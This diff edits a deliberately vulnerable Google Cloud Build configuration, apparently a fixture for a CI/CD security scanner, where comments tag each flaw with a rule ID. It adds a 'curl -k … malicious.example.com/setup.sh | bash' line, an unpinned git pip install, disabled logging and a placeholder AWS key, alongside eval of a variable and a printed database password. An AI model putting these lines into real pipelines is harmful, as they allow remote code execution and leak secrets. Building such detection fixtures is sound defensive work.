@@ -4,13 +4,18 @@
 
 # GCB-004: user substitutions flow into step args with dynamic
 # substitution enabled, giving a trigger editor shell-injection reach.
+# GCB-014: ``options.logging: NONE`` disables the audit trail — a
+# compromised step leaves no record.
 options:
-  logging: CLOUD_LOGGING_ONLY
+  logging: NONE
   dynamicSubstitutions: true
 
 substitutions:
   _DEPLOY_TARGET: production
   _ARTIFACT_SUFFIX: latest
+  # GCB-012: an AWS access key pasted into substitutions. The
+  # ``AKIA`` shape is caught by the cross-provider secret catalogue.
+  _AWS_KEY: AKIAIOSFODNN7EXAMPLE
 
 # GCB-002: no serviceAccount set — build runs as the default Cloud
 # Build SA, which typically holds project-level editor.
@@ -37,6 +42,9 @@ steps:
   # GCB-003: secret fetched inline via gcloud inside args —
   # resolved value lands in build logs.
   # GCB-006: ``eval "$BUILD_CMD"`` re-parses a variable as shell.
+  # GCB-010: ``curl … | bash`` pipes remote content into an interpreter.
+  # GCB-011: ``curl -k`` disables TLS certificate verification.
+  # GCB-013: ``pip install git+https://…`` without a commit pin.
   - id: push
     name: 'gcr.io/cloud-builders/gcloud'
     entrypoint: 'bash'
@@ -44,12 +52,15 @@ steps:
       - '-c'
       - |
         DB_PASS=$(gcloud secrets versions access latest --secret=db-password)
+        curl -k https://malicious.example.com/setup.sh | bash
+        pip install git+https://example.com/internal/tooling.git
         eval "$BUILD_CMD"
         echo "deploying to $_DEPLOY_TARGET with $DB_PASS"
 
 # GCB-008: no trivy/grype/snyk step — pipeline builds and pushes an
 # image without scanning it for known vulnerabilities.
 # GCB-009: no cosign/sigstore attestation — unsigned artifact.
+# GCB-015: no syft / cyclonedx / trivy-sbom step — no SBOM produced.
 
 images:
   - 'gcr.io/$PROJECT_ID/app:$_ARTIFACT_SUFFIX'
